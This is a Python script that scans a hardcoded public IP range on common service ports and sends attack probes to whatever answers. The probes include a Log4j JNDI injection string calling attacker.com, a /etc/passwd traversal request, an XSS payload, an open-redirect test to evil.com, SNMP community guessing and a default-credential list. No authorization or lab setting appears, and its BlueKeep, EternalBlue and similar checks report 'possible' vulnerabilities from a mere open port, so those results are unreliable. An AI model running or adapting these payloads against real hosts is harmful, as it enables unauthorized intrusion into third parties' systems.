import socket
import time
import ipaddress

ip_range = '45.42.173.128/26'
ports = [80, 22, 3389, 161, 445, 135, 25, 443]
TIMEOUT = 3

login_credentials = [
    ("admin", "admin"),
    ("user", "password"),
    ("root", "toor")
]

snmp_communities = ["public", "private", "community"]

def scan_ip_port(ip, port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(TIMEOUT)
            result = s.connect_ex((str(ip), port))
            if result == 0:
                try:
                    s.sendall(b'\r\n')
                    banner = s.recv(1024).decode(errors='ignore')
                except Exception as e:
                    banner = f"No banner received or error: {str(e)}"
                return (True, banner.strip())
            else:
                return (False, "Connection refused or timed out")
    except Exception as e:
        return (False, f"Error: {str(e)}")

def test_ssh_login(ip):
    for username, password in login_credentials:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(TIMEOUT)
                s.connect((str(ip), 22))
                s.sendall(b'SSH-2.0-TestScanner\r\n')
                banner = s.recv(1024).decode(errors='ignore')
                return f"SSH port open. Simulated login attempt with: {username}/{password} (Banner: {banner.strip()})"
        except Exception:
            continue
    return "SSH login simulation failed"

def test_snmp(ip):
    for community in snmp_communities:
        try:
            message = b'\x30\x26\x02\x01\x00\x04' + bytes([len(community)]) + community.encode() + \
                      b'\xa0\x19\x02\x04\x00\x00\x00\x01\x02\x01\x00\x02\x01\x00\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00'
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.settimeout(TIMEOUT)
                s.sendto(message, (str(ip), 161))
                data, _ = s.recvfrom(1024)
                if data:
                    return f"SNMP response with community '{community}': Raw Length {len(data)}"
        except Exception:
            continue
    return "SNMP failed with all community strings"

def test_http(ip):
    results = []
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(TIMEOUT)
            s.connect((str(ip), 80))
            s.sendall(f"GET / HTTP/1.1\r\nHost: {ip}\r\nConnection: close\r\n\r\n".encode())
            response = s.recv(1024).decode(errors='ignore')
            results.append(f"HTTP GET response: {response.splitlines()[0]}")
    except Exception as e:
        results.append(f"HTTP GET request failed: {str(e)}")

    # Log4j
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(TIMEOUT)
            s.connect((str(ip), 80))
            payload = '${jndi:ldap://attacker.com/a}'
            headers = f"GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {payload}\r\nX-Api-Version: {payload}\r\nConnection: close\r\n\r\n"
            s.sendall(headers.encode())
            s.recv(1024)
            results.append("Log4j payload sent. Response received.")
    except Exception as e:
        results.append(f"Log4j test failed: {str(e)}")

    # Directory Traversal
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(TIMEOUT)
            s.connect((str(ip), 80))
            s.sendall(f"GET /../../../../etc/passwd HTTP/1.1\r\nHost: {ip}\r\nConnection: close\r\n\r\n".encode())
            response = s.recv(1024).decode(errors='ignore')
            if "root:" in response:
                results.append("Directory traversal vulnerability detected (/etc/passwd found)")
            else:
                results.append("Directory traversal test sent. No sensitive data in response.")
    except Exception as e:
        results.append(f"Directory traversal test failed: {str(e)}")

    # XSS
    try:
        xss = '<script>alert(1)</script>'
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(TIMEOUT)
            s.connect((str(ip), 80))
            s.sendall(f"GET /?q={xss} HTTP/1.1\r\nHost: {ip}\r\nConnection: close\r\n\r\n".encode())
            response = s.recv(1024).decode(errors='ignore')
            if xss in response:
                results.append("Potential reflected XSS vulnerability detected.")
            else:
                results.append("XSS test sent. Payload not reflected.")
    except Exception as e:
        results.append(f"XSS test failed: {str(e)}")

    # Open Redirect
    try:
        redirect_url = "http://evil.com"
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(TIMEOUT)
            s.connect((str(ip), 80))
            s.sendall(f"GET /redirect?url={redirect_url} HTTP/1.1\r\nHost: {ip}\r\nConnection: close\r\n\r\n".encode())
            response = s.recv(1024).decode(errors='ignore')
            if redirect_url in response or "Location: http://evil.com" in response:
                results.append("Potential open redirect vulnerability detected.")
            else:
                results.append("Open redirect test sent. No redirection found.")
    except Exception as e:
        results.append(f"Open redirect test failed: {str(e)}")

    return '\n    '.join(results)

def test_rdp_vulnerabilities(ip):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(TIMEOUT)
            s.connect((str(ip), 3389))
            s.sendall(b'\x03\x00\x00\x13\x0e\xd0\x00\x00\x12\x34\x00\x02\x01\x00\x08\x00\x03\x00\x00\x00')
            response = s.recv(1024)
            return "RDP port open. Handshake sent. Possible CVE-2019-0708 (BlueKeep)."
    except Exception as e:
        return f"RDP vulnerability check failed: {str(e)}"

def test_smb_vulnerabilities(ip):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(TIMEOUT)
            s.connect((str(ip), 445))
            s.sendall(b'\x00\x00\x00\x85\xffSMB@\x00' + b'\x00' * 128)
            response = s.recv(1024)
            return "SMB response received. Possible CVE-2017-0144 (EternalBlue)."
    except Exception as e:
        return f"SMB vulnerability check failed: {str(e)}"

def test_exchange_vulnerabilities(ip):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(TIMEOUT)
            s.connect((str(ip), 443))
            s.sendall(b"HEAD /owa/auth/logon.aspx HTTP/1.1\r\nHost: " + str(ip).encode() + b"\r\n\r\n")
            response = s.recv(1024).decode(errors='ignore')
            if "X-OWA-Version" in response:
                return "Exchange OWA detected. Possible CVE-2021-26855 (ProxyLogon)."
            return "Exchange check sent. No OWA indicators."
    except Exception as e:
        return f"Exchange check failed: {str(e)}"

def test_rpc_vulnerabilities(ip):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(TIMEOUT)
            s.connect((str(ip), 135))
            s.sendall(b'\x05\x00\x0b\x03\x10\x00\x00\x00')
            response = s.recv(1024)
            return "RPC response received. Potential exposure (e.g., CVE-2021-26877)."
    except Exception as e:
        return f"RPC vulnerability check failed: {str(e)}"

def test_email_vulnerabilities(ip):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(TIMEOUT)
            s.connect((str(ip), 25))
            banner = s.recv(1024).decode(errors='ignore')
            if "Microsoft ESMTP" in banner:
                return "Exchange SMTP detected. Possible CVE-2021-34473."
            elif "Postfix" in banner or "Sendmail" in banner:
                return "Postfix/Sendmail SMTP detected."
            return "SMTP banner received. Unknown server."
    except Exception as e:
        return f"SMTP check failed: {str(e)}"

if __name__ == "__main__":
    network = ipaddress.ip_network(ip_range, strict=False)
    for ip in network.hosts():
        print(f"\nScanning IP: {ip}")
        for port in ports:
            open_status, response = scan_ip_port(ip, port)
            print(f"  Port {port}: {'Open' if open_status else 'Closed'}\n    Response: {response}")
            if open_status:
                if port == 22:
                    print("    ", test_ssh_login(ip))
                elif port == 80:
                    print("    ", test_http(ip))
                elif port == 161:
                    print("    ", test_snmp(ip))
                elif port == 3389:
                    print("    ", test_rdp_vulnerabilities(ip))
                elif port == 445:
                    print("    ", test_smb_vulnerabilities(ip))
                elif port == 443:
                    print("    ", test_exchange_vulnerabilities(ip))
                elif port == 135:
                    print("    ", test_rpc_vulnerabilities(ip))
                elif port == 25:
                    print("    ", test_email_vulnerabilities(ip))
